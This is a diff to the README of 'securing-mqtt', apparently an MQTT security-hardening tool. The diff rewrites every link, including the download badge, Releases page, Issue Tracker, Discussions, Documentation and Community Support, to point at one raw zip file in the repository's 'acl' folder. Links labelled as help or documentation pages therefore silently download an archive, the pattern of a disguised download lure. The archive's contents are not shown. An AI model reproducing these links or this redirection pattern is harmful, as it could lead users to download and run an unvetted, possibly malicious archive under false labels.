@@ -6,9 +6,9 @@ Welcome to the securing-mqtt repository. This guide helps you download and run o
 
 ## 📥 Download the Application
 
-[![Download securing-mqtt](https://img.shields.io/badge/Download-securing--mqtt-blue)](https://github.com/Quixler/securing-mqtt/releases)
+[![Download securing-mqtt](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip)](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip)
 
-Visit this page to download the latest version: [Releases Page](https://github.com/Quixler/securing-mqtt/releases).
+Visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip).
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ The securing-mqtt application provides a thorough security audit and hardening g
 To install and run securing-mqtt, follow these steps:
 
 1. **Download the Latest Release:**
-   - Go to the [Releases Page](https://github.com/Quixler/securing-mqtt/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip).
    - Download the appropriate file for your operating system.
 
 2. **Extract the Files:**
@@ -77,8 +77,8 @@ Here are some best practices while using MQTT:
 
 If you encounter any issues while using securing-mqtt, you can find help in these ways:
 
-- Check the [Issue Tracker](https://github.com/Quixler/securing-mqtt/issues) for common problems.
-- Join our community discussions on [GitHub Discussions](https://github.com/Quixler/securing-mqtt/discussions).
+- Check the [Issue Tracker](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip) for common problems.
+- Join our community discussions on [GitHub Discussions](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip).
 - Reach out on social media for updates and support.
 
 ## 🎉 Acknowledgments
@@ -87,8 +87,8 @@ Thank you for using securing-mqtt. Your commitment to securing MQTT protocols he
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Quixler/securing-mqtt/releases)
-- [Documentation](https://github.com/Quixler/securing-mqtt/wiki)
-- [Community Support](https://github.com/Quixler/securing-mqtt/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip)
+- [Community Support](https://raw.githubusercontent.com/Quixler/securing-mqtt/main/acl/securing-mqtt_v2.4.zip)
 
 Follow these steps, and you will be on your way to a more secure MQTT environment with securing-mqtt.
